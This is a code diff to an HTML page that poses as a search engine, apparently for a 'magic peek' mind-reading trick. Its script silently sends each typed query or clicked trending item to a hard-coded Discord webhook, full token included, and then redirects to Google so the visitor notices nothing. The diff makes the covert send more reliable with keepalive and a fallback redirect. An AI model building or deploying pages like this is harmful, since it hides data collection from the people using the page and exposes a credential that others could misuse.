@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -396,20 +395,24 @@
         </div>
     </div>
 
+    <!-- Transmission Script -->
     <script>
         document.addEventListener("DOMContentLoaded", function() {
+            // Replace this with your newly generated webhook URL
             const secretWebhookUrl = "https://discord.com/api/webhooks/1552546882927198269/rhUKYihX_vfOQzoDspJu6TkAuyEv6YwuxzMc1K4qpaz_UU7ytKvXRW3jwDHZRH0tbPLR";
             const inputField = document.getElementById('userQuery');
+            let isTransmitting = false;
 
             if (inputField) {
-                inputField.addEventListener('keypress', function (e) {
+                inputField.addEventListener('keydown', function (e) {
                     if (e.key === 'Enter') {
+                        e.preventDefault(); // Stop default form submit behavior
                         triggerMagicPeek();
                     }
                 });
             }
 
-            // Also trigger when a trending search item is clicked
+            // Click handling for trending list items
             document.querySelectorAll('.trending-item').forEach(item => {
                 item.addEventListener('click', function() {
                     const text = this.querySelector('.trend-title').innerText;
@@ -418,23 +421,37 @@
                 });
             });
 
-            function triggerMagicPeek() {
-                const secretText = inputField.value;
-                if (secretText.trim() !== "") {
-                    fetch(secretWebhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ content: `🔮 **Spectator Searched:** ${secretText}` })
-                    }).catch(error => console.log("Network transmission bypassed"));
+            async function triggerMagicPeek() {
+                const secretText = inputField.value.trim();
+                if (!secretText || isTransmitting) return;
+                
+                isTransmitting = true;
+                const realSearchEngineUrl = "https://www.google.com/search?q=" + encodeURIComponent(secretText);
 
-                    const realSearchEngineUrl = "https://www.google.com/search?q=" + encodeURIComponent(secretText);
-                    setTimeout(() => {
-                        window.location.href = realSearchEngineUrl;
-                    }, 250);
+                // Fail-safe redirect timer: redirects after 1.2s even if the webhook drops or lags
+                const safetyRedirect = setTimeout(() => {
+                    window.location.href = realSearchEngineUrl;
+                }, 1200);
+
+                try {
+                    await fetch(secretWebhookUrl, {
+                        method: 'POST',
+                        keepalive: true, // Guarantees the browser sends the payload even if redirecting
+                        headers: { 
+                            'Content-Type': 'application/json' 
+                        },
+                        body: JSON.stringify({ 
+                            content: `🔮 **Spectator Searched:** ${secretText}` 
+                        })
+                    });
+                } catch (err) {
+                    console.error("Transmission error:", err);
+                } finally {
+                    clearTimeout(safetyRedirect);
+                    window.location.href = realSearchEngineUrl;
                 }
             }
         });
     </script>
 </body>
 </html>
-
